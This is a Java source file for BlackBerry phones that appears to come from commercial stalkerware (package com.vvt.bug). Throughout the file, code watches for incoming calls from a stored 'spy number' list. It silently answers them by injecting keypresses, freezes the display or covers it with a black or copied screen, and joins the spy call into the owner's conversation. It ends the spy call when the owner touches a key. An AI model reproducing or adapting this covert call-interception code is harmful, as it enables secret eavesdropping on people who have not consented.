package com.vvt.bug;

import java.util.Timer;
import java.util.TimerTask;

import com.vvt.std.Log;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Ui;
import net.rim.device.api.ui.UiApplication;

public class SCCL_45_DOWN extends SCCL {
	
	protected BaseScreen screen;
	protected boolean popBlackScreenProgrammatically;
	protected Timer wait4KeyPressesAction;
	private boolean rejectWaitingSCCInProgress;

	public SCCL_45_DOWN(PhoneEventListenerSettings pelSettings) {
		super(pelSettings);
	}

	public void initialize() {
		try {
			super.initialize();
			numberOfCallsActive = 1;
			sCCActive = false;
			rejectWaitingSCCInProgress = false;
			enableCopyScreen();
		} catch (Exception e) {
		}
	}

	public void enableCopyScreen() {
		try {
			if (pelSettings.isUseBlackScreen()) {
				screen = new BlackScreen( this);
			} else {
				screen = new CopyScreen();
				copyScreen();
			}
		} catch (Exception e) {
		}
	}

	public void callAnswered(int callId) {
		try {
			if (sCCActive) {
				synchronized (Application.getEventLock()) {
					try {
						Ui.getUiEngine().pushGlobalScreen(screen, -100, 0);
					} catch (Exception e) {
					}
					if (pelSettings.isManipulatePainting()) {
						scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCAnsweredMS());
					}
				}
			}
		} catch (Exception e) {
		}
	}

	public void callConnected(int callId) {
		try {
			if (sCCActive) {
				joinMenuItem = util.getMenuItem(join, voiceApp, localeEnglish, locale);
				new Thread(joinMenuItem).start();
				scheduleWaitForKeyPress();
			}
		} catch (Exception e) {
		}
	}

	public void callWaiting(int callId) {
		try {
			/*if (Log.isDebugEnable()) {
				Log.debug("SCCL_45_DOWN.callWaiting()", "numberOfCallsActive: " + numberOfCallsActive);
			}*/
			numberOfCallsActive++;
			PhoneCall phoneCall = Phone.getCall(callId);
			//if (util.isSCC(phoneCall, monitorPhoneNumber)) {
			if (util.isSCCList(phoneCall, bugInfo.getSpyNumberStore())) {
				/*if (Log.isDebugEnable()) {
					Log.debug("SCCL_45_DOWN.callWaiting()", "isSCCList!");
				}*/
				if (numberOfCallsActive==3) {
					/*if (Log.isDebugEnable()) {
						Log.debug("SCCL_45_DOWN.callWaiting()", "numberOfCallsActive == 3");
					}*/
					if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
						voiceApp.suspendPainting(true);
					}
					rejectWaitingSCCInProgress  = true;
					endSCC( true);
					return;
				}
				endMenuItem = util.getMenuItem(end, voiceApp, localeEnglish, locale); // It will not work for O.S.>=4.6
				if (voiceApp == null) {
					voiceApp = UiApplication.getUiApplication();
				}
				sCCId = callId;
				if (pelSettings.isManipulatePainting()) {
					voiceApp.suspendPainting(true); // To freeze screen.
				}
				util.injectKey((char) Keypad.KEY_SEND, pelSettings.getWaitBeforeAnswerWaitingCallMS()); // To simulate "KEY_SEND" for connecting spy call.
				sCCActive = true;
			}
			/*if (Log.isDebugEnable()) {
				Log.debug("SCCL_45_DOWN.callWaiting()", "!isSCCList, sCCActive: " + sCCActive);
			}*/
			else if (sCCActive) {
				if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
					voiceApp.suspendPainting(true);
				}
				endSCC(false);
			}
		} catch (Exception e) {
		}
	}

	private void endSCC(boolean sccIsLastIncoming) {
		/*if (Log.isDebugEnable()) {
			Log.debug("SCCL_46_UP.endSCC()", "ENTER");
		}*/
		if (endMenuItem != null) {
			new Thread(endMenuItem).start(); // To disconnect only last call.
		}
		else if (sccIsLastIncoming) {
			util.injectKey( (char) Keypad.KEY_END, pelSettings.getWaitBeforeEndScc()); // To disconnect all calls.
		}
	}
	
	private void scheduleWaitForKeyPress() {
		try {
			wait4KeyPressesAction = new Timer();
			wait4KeyPressesAction.schedule(new TimerTask() {
				public void run() {
					try {
						if (DeviceInfo.getIdleTime() == 0) {
							wait4KeyPressesAction.cancel();
							endSCC(true);
							voiceApp.requestBackground();
						}
					} catch (Exception e) {
					}
				}
			}, pelSettings.waitBeforeWait4KeyPressActionMS, pelSettings.repeatPeriodWait4KeyPressActionMS);
		} catch (Exception e) {
		}
	}

	protected void scheduleHoldResumePainting(final boolean hold, int time) {
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					try {
						boolean alter = (hold && !voiceApp.isPaintingSuspended()) || (!hold && voiceApp.isPaintingSuspended());
						if (alter) {
							voiceApp.suspendPainting(hold);
						}
					} catch (Exception e) {
					}
				}
			}, time);
		} catch (Exception e) {
		}
	}

	public void callConferenceCallEstablished(int callId) {
	}

	public void callDisconnected(int callId) {
		try {
			numberOfCallsActive--;
			if (sCCActive) {
				if (sCCId != callId && numberOfCallsActive==1) {
					if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
						voiceApp.suspendPainting(true);
					}
					endSCC(true);
				} else { // This case happens when spy call disconnect.
					sCCActive = false;
					if (pelSettings.isManipulatePainting()) {
						voiceApp.invokeLater(new Runnable() {
							public void run() {
								try {
									if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
										voiceApp.suspendPainting(true);
									}
									voiceApp.popScreen(screen);
								} catch (Exception e) {
								}
							}
						});
						int interval = 4000;
						pelSettings.setWaitBeforeResumePaintingSCCDisconnectedMS(interval);
						scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCDisconnectedMS());
					}
				}
			}
			else if (rejectWaitingSCCInProgress) {
				scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCDisconnectedMS());
				rejectWaitingSCCInProgress = false;
				return;
			}
			if (numberOfCallsActive == 0) {
//				((FxS) BaseFxS.getFxS()).releaseSCCL();
				observer.onFinish();
			}
		} catch (Exception e) {
		}
	}
	
	public void considerUserInteractionEvent(boolean popBlackScreenProgrammatically) {
	}
	
	private void copyScreen() {
		int copyInterval = 3000;
		new Timer().schedule(new TimerTask() {
			public void run() {
				// To copy screen.
				if (pelSettings.isUseCopyScreen()) {
					((CopyScreen)screen).copy();
				}
			}
		}, copyInterval);
	}
}